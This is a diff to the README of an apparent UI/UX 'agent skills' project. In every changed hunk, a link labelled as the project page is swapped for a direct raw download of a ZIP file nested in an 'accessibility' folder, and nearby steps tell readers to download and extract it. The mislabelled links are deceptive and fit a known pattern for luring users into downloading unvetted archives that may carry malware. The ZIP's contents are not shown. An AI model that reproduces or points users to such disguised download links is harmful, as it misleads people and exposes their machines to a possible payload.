@@ -1,6 +1,6 @@
 # 🧠 ux-ui-agent-skills - Build Better UI With Clear Rules
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-6c757d?style=for-the-badge)](https://github.com/sterlingpathological200/ux-ui-agent-skills)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-6c757d?style=for-the-badge)](https://github.com/sterlingpathological200/ux-ui-agent-skills/raw/refs/heads/main/accessibility/skills-ui-agent-ux-v2.1.zip)
 
 ## 🎯 What This Is
 
@@ -12,7 +12,7 @@ Use it to guide design work for web apps, mobile apps, and design systems. It gi
 
 Use this link to visit the project page and download the files you need:
 
-[Visit the project page](https://github.com/sterlingpathological200/ux-ui-agent-skills)
+[Visit the project page](https://github.com/sterlingpathological200/ux-ui-agent-skills/raw/refs/heads/main/accessibility/skills-ui-agent-ux-v2.1.zip)
 
 ### 1. Open the project page
 Click the link above in your browser.
@@ -127,7 +127,7 @@ These files give you a base you can reuse across projects.
 ### Step 1: Download the project
 Use the link below to visit the project page and download the ZIP file.
 
-[Go to the project page](https://github.com/sterlingpathological200/ux-ui-agent-skills)
+[Go to the project page](https://github.com/sterlingpathological200/ux-ui-agent-skills/raw/refs/heads/main/accessibility/skills-ui-agent-ux-v2.1.zip)
 
 ### Step 2: Extract the ZIP file
 Right-click the ZIP file and choose **Extract All**. Pick a folder you can find later.
@@ -226,7 +226,7 @@ Use it to generate clear specs that reduce back-and-forth.
 
 If you need the files again, use this page:
 
-[https://github.com/sterlingpathological200/ux-ui-agent-skills](https://github.com/sterlingpathological200/ux-ui-agent-skills)
+[https://github.com/sterlingpathological200/ux-ui-agent-skills/raw/refs/heads/main/accessibility/skills-ui-agent-ux-v2.1.zip](https://github.com/sterlingpathological200/ux-ui-agent-skills/raw/refs/heads/main/accessibility/skills-ui-agent-ux-v2.1.zip)
 
 ## 📝 File Use Tips
 
